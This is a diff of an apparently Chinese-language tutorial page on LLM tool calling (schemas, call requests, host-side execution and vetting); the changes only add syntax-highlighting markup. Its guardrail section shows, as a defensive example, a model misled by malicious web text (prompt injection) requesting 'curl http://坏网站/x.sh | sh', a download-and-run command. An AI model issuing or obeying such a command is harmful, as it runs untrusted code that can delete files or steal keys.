@@ -56,21 +56,21 @@
 <p>工具调用有一个固定的&quot;三段式&quot;结构。用点外卖来比喻：</p>
 <table><thead><tr><th>阶段</th><th>外卖比喻</th><th>工具调用里的术语</th></tr></thead><tbody><tr><td><strong>1. 有哪些能点的</strong></td><td>菜单（宫保鸡丁、鱼香肉丝…）</td><td>工具清单（tools / schema）：告诉大模型有哪些工具、每个要填什么参数</td></tr><tr><td><strong>2. 下单</strong></td><td>&quot;我要一份宫保鸡丁，不要辣&quot;</td><td>工具调用请求：工具名 + 参数（JSON）</td></tr><tr><td><strong>3. 出餐</strong></td><td>餐送到手上</td><td>工具结果：程序执行后返回的数据</td></tr></tbody></table>
 <p>具体到代码，一次工具调用请求大概是这个样子（你不用会写，看懂结构就行）：</p>
-<pre><code class="language-json">{
-  &quot;tool&quot;: &quot;readFile&quot;,
-  &quot;arguments&quot;: { &quot;path&quot;: &quot;README.md&quot; }
-}</code></pre>
+<pre><code class="language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;tool&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;readFile&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;arguments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;README.md&quot;</span> <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre>
 <p>执行程序看到这张&quot;单子&quot;，就真的去读 <code>README.md</code>，然后把内容作为<strong>结果</strong>还给大模型。</p>
 <h3 id="为什么工具要先有一张-菜单-schema">为什么工具要先有一张&quot;菜单&quot;（schema）？<a class="anchor" href="#为什么工具要先有一张-菜单-schema" aria-label="锚点">#</a></h3>
 <p>想象你去一家餐厅，菜单上写着&quot;宫保鸡丁&quot;，但没写要不要选辣度、要不要加饭。你就不知道该怎么点。工具也一样：模型得先知道<strong>每个工具叫什么名字、需要填哪些参数、每个参数是什么类型</strong>，才能正确&quot;下单&quot;。</p>
 <p>这张&quot;菜单&quot;就叫 <strong>schema（结构描述）</strong>。它长这样（同样，看懂就行）：</p>
-<pre><code class="language-json">{
-  &quot;name&quot;: &quot;readFile&quot;,
-  &quot;description&quot;: &quot;读取一个文本文件的内容&quot;,
-  &quot;parameters&quot;: {
-    &quot;path&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;description&quot;: &quot;文件的路径，例如 README.md&quot; }
-  }
-}</code></pre>
+<pre><code class="language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;readFile&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;读取一个文本文件的内容&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;文件的路径，例如 README.md&quot;</span> <span class="hljs-punctuation">}</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre>
 <p>有了这张 schema，模型才知道：</p>
 <ul><li>这个工具叫 <code>readFile</code>；</li><li>它是用来&quot;读文件&quot;的（<code>description</code> 帮模型判断什么时候该用它）；</li><li>它需要一个叫 <code>path</code> 的字符串参数。</li></ul>
 <p><strong>没有 schema，模型就是在黑暗里瞎点单。</strong> schema 越清楚，模型点单越准。</p>
@@ -134,10 +134,10 @@
 <h2 id="七-讲透-安全护栏-为什么中间必须隔一层">七、讲透&quot;安全护栏&quot;：为什么中间必须隔一层<a class="anchor" href="#七-讲透-安全护栏-为什么中间必须隔一层" aria-label="锚点">#</a></h2>
 <p>前面反复说&quot;模型决定、宿主执行&quot;是为了安全。这一节把这层安全讲透。</p>
 <p>设想一个可怕的场景：模型（可能被网页上的恶意文字诱导）产生了这样一张申请单：</p>
-<pre><code class="language-json">{
-  &quot;tool&quot;: &quot;runCommand&quot;,
-  &quot;arguments&quot;: { &quot;command&quot;: &quot;curl http://坏网站/x.sh | sh&quot; }
-}</code></pre>
+<pre><code class="language-json"><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;tool&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;runCommand&quot;</span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;arguments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;curl http://坏网站/x.sh | sh&quot;</span> <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre>
 <p>这条命令的意思是：<strong>从一个陌生网站下载一段脚本，并立刻执行</strong>——这是典型的&quot;下载即执行&quot;攻击，脚本里可能藏着删文件、偷密钥的坏事。</p>
 <p>如果模型能直接执行，灾难就发生了。但因为<strong>执行权在宿主手里</strong>，这张申请单会先经过第 ③ 步&quot;安检&quot;：</p>
 <pre class="mermaid">sequenceDiagram
@@ -159,7 +159,7 @@
 <p>理论看再多，不如亲手（或在脑子里）走一遍。下面两个实验帮你把&quot;三段式 / 五步&quot;变成肌肉记忆。</p>
 <h3 id="实验-a-脑内推演一次-readfile">实验 A：脑内推演一次 readFile<a class="anchor" href="#实验-a-脑内推演一次-readfile" aria-label="锚点">#</a></h3>
 <p>闭上眼，想象你就是宿主，模型给你递来这张纸条：</p>
-<pre><code class="language-json">{ &quot;tool&quot;: &quot;readFile&quot;, &quot;arguments&quot;: { &quot;path&quot;: &quot;README.md&quot; } }</code></pre>
+<pre><code class="language-json"><span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;tool&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;readFile&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;arguments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;README.md&quot;</span> <span class="hljs-punctuation">}</span> <span class="hljs-punctuation">}</span></code></pre>
 <p>现在，<strong>你（宿主）按顺序做这几件事</strong>，每做一步，问自己一个问题：</p>
 <ol><li><strong>认单</strong>：这个工具 <code>readFile</code> 我这儿有吗？（有 → 继续；没有 → 回一句&quot;没这个工具&quot;）</li><li><strong>验参</strong>：它给的 <code>path</code> 是字符串吗？路径合法吗？指向的是不是敏感位置？</li><li><strong>执行</strong>：真的打开 <code>README.md</code>，把内容读出来。</li><li><strong>回灌</strong>：把内容（或&quot;文件不存在&quot;的错误）作为结果递回给模型。</li></ol>
 <p>走完你会发现：<strong>模型从头到尾只贡献了那张纸条，剩下四步全是你干的。</strong> 这就是&quot;模型动嘴、宿主动手&quot;的真实体感。</p>
